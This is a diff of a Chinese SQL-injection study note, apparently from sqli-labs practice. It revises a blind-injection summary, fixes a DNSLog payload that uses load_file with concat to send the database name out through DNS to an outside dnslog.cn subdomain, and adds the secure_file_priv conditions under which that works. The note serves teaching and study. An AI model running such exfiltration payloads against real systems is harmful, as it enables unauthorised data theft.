@@ -658,9 +658,9 @@ http://192.168.96.135/sqli-labs/Less-9/
 
 ## 盲注总结
 
-1. ==可以发生回显、报错、bool注入的地方都可以发生时间盲注，反之不行==
+1. ==可以使用回显、报错、bool注入的地方都可以使用时间盲注，反之则不一定==
 
-2. ==可以发生回显报错的地方一定可以bool型盲注，反之不行==
+2. ==可以发生回显报错的地方一定可以bool型盲注，反之不一定==
 
 ## 报错注入
 
@@ -903,14 +903,23 @@ update会修改数据库里原有记录的值,如果select注入只能使用延�
    ```mysql
    select load_file("\\\\test.xkpb07.dnslog.cn\\aa");
    #xkpb07.dnslog.cn是在dnslog生成的三级域名,可以使用concat将要查询的内容放到第四级域名,如果数据库用户有文件读写权限,则可以将查询内容带到dnslog.cn上面
-   select load_file("\\\\",database(),".xkpb07.dnslog.cn\\aa");
+   select load_file(concat('\\\\',(select database()),'.jtc581.dnslog.cn/abc'));
    ```
 
 **需要注意的是windows中的文件资源管理器中的文件目录用的是反斜杠 \ ，而我们的网站中文件的目录索引用的是斜杠 / ，我们这里load_file函数必须用斜杠 / 索引文件**
 
 可不可以通过不受secure_file_priv限制的load data infile 或者 load data local infile 执行dnslog注入
 
+### DNSLog利用的条件
 
+DNSLog需要利用的load_file()，所以load_file()能使用的权限是必不可少的，load_file()的使用条件是root且配置得有一定要求，使用命令show variables like "%secure%"查询权限如下：
+
+1、当secure_file_priv为空，就可以读取磁盘的目录。
+
+
+2、当secure_file_priv为 /，就可以读取根目录 / 下的文件。
+
+3、当secure_file_priv为NULL，load_file就不能加载文件。
 
 ## 宽字节注入:
 
